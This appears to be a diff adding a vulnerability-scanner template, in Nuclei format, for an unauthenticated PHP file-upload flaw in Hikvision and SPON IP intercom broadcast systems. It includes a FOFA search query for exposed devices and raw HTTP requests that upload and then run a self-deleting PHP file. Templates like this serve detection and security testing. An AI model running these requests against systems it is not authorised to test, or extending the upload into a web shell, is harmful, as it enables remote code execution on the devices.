@@ -1,0 +1,46 @@
+id: hikvision-spon-group-intercom-uploadjson-fileupload
+info:
+  name: hikvision 群组对讲服务配置平台 or 世邦通信 SPON IP 网络对讲广播系统 uploadjson.php - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-1830859634" || body="js/jquery.breadcrumbs.ex.js"
+  tags: 2021,fileupload,spon,hikvision
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+http:
+  - raw:
+      - |
+        POST /php/uploadjson.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 60
+
+        jsondata[filename]={{filename}}.php&jsondata[data]=<?php print("{{randstr}}");unlink(__FILE__);?>
+      
+      - |+
+        GET /lan/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
